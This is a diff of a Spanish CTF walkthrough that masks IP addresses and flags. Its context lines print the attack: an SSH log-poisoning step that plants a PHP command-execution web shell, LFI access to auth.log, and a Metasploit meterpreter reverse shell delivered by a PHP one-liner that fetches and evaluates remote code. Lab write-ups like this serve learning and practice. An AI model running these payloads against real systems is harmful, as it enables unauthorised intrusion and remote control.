@@ -41,11 +41,11 @@ Aquí veremos que esta conectado a la subred, los puerto abiertos, las paginas w
 
 Veremos que redes estan conectadas a esta subred con este comando:
 
-```nmap -sP 192.168.221.0/24```
+```nmap -sP X.X.X.0/24```
 
 Para ver los puertos abiertos que tiene la red utilizaremos este comando:
 
-```nmap -sV -sC 192.168.221.6```
+```nmap -sV -sC X.X.X.6```
 
 ### Web
 
@@ -80,7 +80,7 @@ Lo primero que haremos es leer el archivo ```/var/log/auth.log``` para ver si lo
 
 Procederemos ha poner un **codigo malicioso con php**(log poisoning) en la conexion ssh para poder ejecutar comandos del sistema como si fuese el cmd o la terminal:
 
-```ssh '<?php system($_GET['c']); ?>'@192.168.221.6```
+```ssh '<?php system($_GET['c']); ?>'@X.X.X.6```
 
 Lo siguiente es añadir a la url ```?file=/var/log/auth.log&c=``` para poder ejecutar comandos.
 
@@ -106,24 +106,24 @@ Exploit targets:
    8   Mac OS X
 msf6 exploit(multi/script/web_delivery) > set target 1
 msf exploit (web_delivery)> set payload php/meterpreter/reverse_tcp
-msf exploit (web_delivery)> set lhost 192.168.221.4
+msf exploit (web_delivery)> set lhost X.X.X.4
 msf exploit (web_delivery)>set srvport 8081
 msf exploit (web_delivery)>exploit
 ```
 
 ```
-php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.221.4:8081/CPKPsYZc', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
+php -d allow_url_fopen=true -r "eval(file_get_contents('http://X.X.X.4:8081/CPKPsYZc', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
 ```
 
 > Aquí el payload que me ha dado
 
-La pondremo delante de ```192.168.221.6/ikilledsiriusblack.php?file=/var/log/auth.log&c=``` y nos creara un session en meterpreter.
+La pondremo delante de ```X.X.X.6/ikilledsiriusblack.php?file=/var/log/auth.log&c=``` y nos creara un session en meterpreter.
 
 Por ahora somos usuario **bellatrix**
 
 ## Post-explotación
 
-Aquí tenemos la primera flag: **user: {69e0f71f25ece4351e4d73af430bec43}**
+Aquí tenemos la primera flag: X
 
 ## Recopilación de información
 
@@ -200,7 +200,7 @@ Y aquí tenemos la segunda flag:
 
 
 
-root{ead5a85a11ba466011fced308d460a76}
+X
 ```
 ## Información Adicional
 
